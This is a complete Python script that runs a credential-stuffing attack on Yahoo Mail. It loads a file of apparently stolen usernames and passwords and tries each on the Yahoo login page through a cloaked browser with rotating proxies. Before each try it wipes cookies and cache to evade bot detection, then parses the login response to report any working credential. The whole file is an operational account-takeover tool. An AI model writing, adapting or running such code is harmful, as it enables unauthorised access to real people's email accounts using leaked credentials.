#!/usr/bin/env python3
"""
Try every Yahoo Mail credential in the TSV until one logs in.

Keeps a single bdg + CBM profile session alive. Before each attempt the
profile's cookies/storage/cache are fully cleared, and the browser is reset
to the Yahoo username page. Every interaction snapshots the UI state before
and after, so navigation dead-ends (bot sandbox, captcha challenge, error
pages) are detected by delta rather than by guesswork.

Usage:
    python scripts/find_valid_yahoo_cred_persist.py [--limit N] [--start N]
"""
from __future__ import annotations

import argparse
import csv
import json
import subprocess
import sys
import time
from pathlib import Path

TSV = Path("/Volumes/Untitled/cookies/data/0730/cleaned/mail_yahoo_creds.tsv")
BDG = "bdg"
PROFILE = "proxy-rotating"
LOGIN_URL = "https://login.yahoo.com/?src=ym&pspid=&activity=mail-direct&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fn%2F"
ORIGIN = "https://login.yahoo.com"
USERNAME_SEL = "#username"
PASSWORD_SEL = "#login-passwd"
SUBMIT_SEL = 'button[type="submit"]'

# UI markers: (label, substring to search body text for)
ERROR_MARKERS = [
    ("invalid_creds", "invalid username or password"),
    ("account_locked", "account is locked"),
    ("unusual_activity", "unusual sign-in activity"),
    ("suspended", "suspended"),
    ("bot_challenge", "verify that you are human"),
    ("security_check", "security check"),
]
STATE_SELS = [USERNAME_SEL, PASSWORD_SEL]


def run_bdg(args: list[str], *, json_output: bool = False, check: bool = True) -> dict | str:
    cmd = [BDG, *args]
    if json_output:
        cmd.append("--json")
    result = subprocess.run(cmd, capture_output=True, text=True, check=check)
    if json_output:
        return json.loads(result.stdout)
    return result.stdout


def stop_existing_session() -> None:
    subprocess.run([BDG, "stop"], capture_output=True, text=True)
    subprocess.run([BDG, "cleanup", "--force"], capture_output=True, text=True)


def start_session(profile: str) -> None:
    """Start the bdg session on a neutral page."""
    run_bdg(["cloak", "connect", profile, "about:blank"], check=True)
    time.sleep(5)


def clear_profile() -> None:
    """Wipe cookies, storage, and cache so each attempt is a fresh visitor."""
    run_bdg(["cdp", "Network.enable"], check=False)
    run_bdg(["cdp", "Storage.clearCookies"], check=False)
    run_bdg(
        [
            "cdp",
            "Storage.clearDataForOrigin",
            "--params",
            json.dumps({"origin": ORIGIN, "storageTypes": "all"}),
        ],
        check=False,
    )
    run_bdg(["cdp", "Network.clearBrowserCache"], check=False)


def cdp_eval(expression: str, *, check: bool = False) -> dict | None:
    raw = run_bdg(
        [
            "cdp",
            "Runtime.evaluate",
            "--params",
            json.dumps({
                "expression": expression,
                "awaitPromise": False,
                "returnByValue": True,
            }),
        ],
        json_output=False,
        check=check,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return None


def ui_state() -> dict:
    """Snapshot the current page: url, title, visible inputs, error markers."""
    url = cdp_eval("location.href") or ""
    title = cdp_eval("document.title") or ""
    inputs = cdp_eval(
        "(()=>[...document.querySelectorAll('input')]"
        ".filter(i=>i.type!=='hidden').map(i=>i.name||i.id||i.type))()"
    ) or []
    body = cdp_eval("document.body?document.body.innerText.slice(0,600):''") or ""
    body_lc = body.lower()
    markers = [label for label, text in ERROR_MARKERS if text in body_lc]
    has_username = USERNAME_SEL.lstrip("#") in inputs or bool(
        cdp_eval(f"!!document.querySelector({json.dumps(USERNAME_SEL)})")
    )
    has_password = bool(cdp_eval(f"!!document.querySelector({json.dumps(PASSWORD_SEL)})"))
    return {
        "url": url,
        "title": title,
        "inputs": inputs,
        "markers": markers,
        "has_username": has_username,
        "has_password": has_password,
        "body_sig": hash(body),
    }


def wait_for_element(selector: str, *, timeout: float = 30.0, poll: float = 0.5) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = run_bdg(["dom", "query", selector], json_output=True)
            count = data.get("data", {}).get("count", 0)
            if count and count > 0:
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


def fill_field(selector: str, value: str) -> None:
    expr = f"""
(() => {{
  const el = document.querySelector({json.dumps(selector)});
  if (!el) throw new Error('Element not found: ' + {json.dumps(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  el.focus();
  setter.call(el, {json.dumps(value)});
  el.dispatchEvent(new Event('input', {{ bubbles: true }}));
  el.dispatchEvent(new Event('change', {{ bubbles: true }}));
  el.blur();
  return el.value;
}})()
"""
    raw = run_bdg(
        [
            "cdp",
            "Runtime.evaluate",
            "--params",
            json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True}),
        ],
        json_output=False,
        check=True,
    )
    actual = json.loads(raw)["data"]["result"]["result"]["value"]
    if actual != value:
        raise RuntimeError(f"Field {selector} did not accept value (got: {actual})")


def click_submit() -> None:
    run_bdg(["dom", "click", SUBMIT_SEL], check=True)


def get_validate_response(*, wait: float = 20.0, poll: float = 0.5) -> str | None:
    """Poll the network log for the password validate response body."""
    deadline = time.time() + wait
    while time.time() < deadline:
        try:
            data = run_bdg(["network", "list"], json_output=True)
            reqs = data.get("data", []) if isinstance(data.get("data"), list) else data.get("data", {}).get("requests", [])
            validate = next(
                (r for r in reqs if r.get("method") == "POST" and "/account/challenge/password/validate" in r.get("url", "")),
                None,
            )
            if validate:
                detail = run_bdg(["details", "network", validate["requestId"]], json_output=True)
                body = detail.get("data", {}).get("item", {}).get("responseBody", "")
                return body
        except Exception:
            pass
        time.sleep(poll)
    return None


def is_successful_login(response_body: str | None) -> bool:
    if not response_body:
        return False
    try:
        data = json.loads(response_body)
        redirect = data.get("redirect", "")
        return redirect.startswith("/") and "mail.yahoo.com" in redirect and "e=true" not in redirect
    except Exception:
        return False


def classify_state(state: dict) -> str | None:
    """Return a label if the current UI state is a known dead-end."""
    if state["markers"]:
        return state["markers"][0]
    if "login" not in state["url"]:
        return f"navigated_away:{state['url'][:60]}"
    return None


def try_credential(username: str, password: str) -> tuple[bool, str]:
    """Attempt one credential. Returns (success, reason)."""
    clear_profile()
    run_bdg(["cdp", "Page.navigate", "--params", json.dumps({"url": LOGIN_URL})], check=False)
    if not wait_for_element(USERNAME_SEL, timeout=30):
        return False, "username field did not appear (bot sandbox?)"

    # --- step 1: username -> password field ---
    before = ui_state()
    fill_field(USERNAME_SEL, username)
    click_submit()
    time.sleep(2)
    after = ui_state()

    if not after["has_password"]:
        dead_end = classify_state(after)
        if dead_end:
            return False, f"username step dead-end: {dead_end}"
        if after["body_sig"] == before["body_sig"]:
            return False, "username step: page unchanged after submit (submit swallowed?)"
        return False, "password field did not appear"

    # --- step 2: password -> validate response ---
    before = ui_state()
    fill_field(PASSWORD_SEL, password)
    time.sleep(0.5)
    click_submit()

    body = get_validate_response()
    if body and is_successful_login(body):
        return True, f"redirect: {json.loads(body).get('redirect')}"

    after = ui_state()
    dead_end = classify_state(after)
    if dead_end:
        return False, f"password step dead-end: {dead_end}"
    error = page_error_text()
    return False, f"no validate body; page_error={error[:80]}"


def page_error_text() -> str:
    return cdp_eval("document.body ? document.body.innerText.trim().slice(0, 200) : ''") or ""


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--limit", type=int, default=0, help="only try first N credentials")
    parser.add_argument("--start", type=int, default=0, help="skip first N credentials")
    args = parser.parse_args()

    if not TSV.exists():
        print(f"Credential file not found: {TSV}", file=sys.stderr)
        return 1

    rows = []
    with TSV.open(newline="") as f:
        reader = csv.DictReader(f, delimiter="\t")
        for row in reader:
            rows.append((row["url"], row["username"], row["password"]))

    print(f"Loaded {len(rows)} credential rows. Starting session with profile {PROFILE}...")
    stop_existing_session()
    start_session(PROFILE)

    attempted = 0
    for idx, (url, username, password) in enumerate(rows):
        if "yahoo.com" not in username:
            continue
        if idx < args.start:
            continue
        attempted += 1
        if args.limit and attempted > args.limit:
            break
        print(f"\n[{attempted}] Trying {username} ...")
        try:
            success, reason = try_credential(username, password)
            print(f"    result={success} {reason}")
            if success:
                print(f"\n>>> VALID CREDENTIAL FOUND: {username} / {password}")
                return 0
        except RuntimeError as exc:
            print(f"    ERROR: {exc}")
            stop_existing_session()
            start_session(PROFILE)
        except subprocess.CalledProcessError as exc:
            print(f"    bdg command failed: {exc.stderr or exc.stdout}", file=sys.stderr)
            return 1

    print("\nNo valid credential found.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
